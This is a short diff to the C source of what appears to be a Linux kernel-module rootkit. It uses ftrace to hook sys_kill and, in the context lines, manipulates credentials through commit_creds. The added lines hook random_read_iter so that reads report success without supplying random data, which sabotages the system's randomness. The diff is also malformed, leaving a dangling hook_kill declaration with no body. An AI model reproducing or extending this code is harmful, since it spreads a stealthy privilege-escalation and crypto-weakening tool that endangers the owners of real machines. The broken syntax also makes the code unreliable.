@@ -127,9 +127,17 @@ void del_root(void)
     commit_creds(user);
 }
 
+static asmlinkage ssize_t orig_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter);
+
+static asmlinkage int hook_kill(pid_t pid, int sig)
+static asmlinkage ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter) {
+  return iter->count;
+}
+
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
 };
 
 /* Module initialization function */
